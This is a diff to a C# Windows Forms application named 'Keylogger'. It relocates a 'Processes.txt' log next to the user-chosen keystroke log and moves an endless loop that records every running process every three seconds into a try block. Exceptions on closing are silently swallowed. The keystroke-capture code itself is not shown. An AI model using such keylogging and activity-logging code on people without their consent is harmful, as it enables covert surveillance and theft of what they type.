@@ -33,6 +33,7 @@ namespace Keylogger
         }
 
         string filename = "Keylogger.txt";
+        string fileProcessesName = "Processes.txt";
         bool WriteToFile = true;
         int seconds = 0;
         System.IO.StreamWriter writer;
@@ -44,6 +45,7 @@ namespace Keylogger
             if (SaveFileDialog.ShowDialog() != DialogResult.Cancel)
             {
                 filename = SaveFileDialog.FileName;
+                fileProcessesName = Path.GetDirectoryName(SaveFileDialog.FileName) + "\\" + fileProcessesName;
                 lblFilename.Text = filename;
                 lblFilename.ForeColor = Color.Black;
                 System.IO.File.Create(filename).Close();
@@ -89,29 +91,27 @@ namespace Keylogger
                 seconds = 0;
                 await Task.Run(() =>
                 {
-                    if (!File.Exists("Processes.txt"))
+                    if (!File.Exists(fileProcessesName))
                     {
-                        FileStream fs = File.Create("Processes.txt");
+                        FileStream fs = File.Create(fileProcessesName);
                         fs.Close();
                     }
-                    do
-                    {
-                        foreach (Process process in Process.GetProcesses())
-                        {
-                            var processes = File.ReadAllText("Processes.txt");
-                            if (!processes.Contains(process.ProcessName))
-                            {
-                                StreamWriter processWriter = File.AppendText("Processes.txt");
-                                processWriter.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
-                                processWriter.Close();
-                            }
-                        }
-                        Thread.Sleep(3000);
-                    } while (true);
                     try
                     {
-                        
-
+                        do
+                        {
+                            foreach (Process process in Process.GetProcesses())
+                            {
+                                var processes = File.ReadAllText(fileProcessesName);
+                                if (!processes.Contains(process.ProcessName))
+                                {
+                                    StreamWriter processWriter = File.AppendText(fileProcessesName);
+                                    processWriter.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
+                                    processWriter.Close();
+                                }
+                            }
+                            Thread.Sleep(3000);
+                        } while (true);
                     }
                     catch (Exception)
                     {
@@ -169,7 +169,13 @@ namespace Keylogger
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Stop();
+            try
+            {
+                Stop();
+            }
+            catch (Exception)
+            {
+            }
         }
 
         private void btnStop_Click(object sender, EventArgs e)
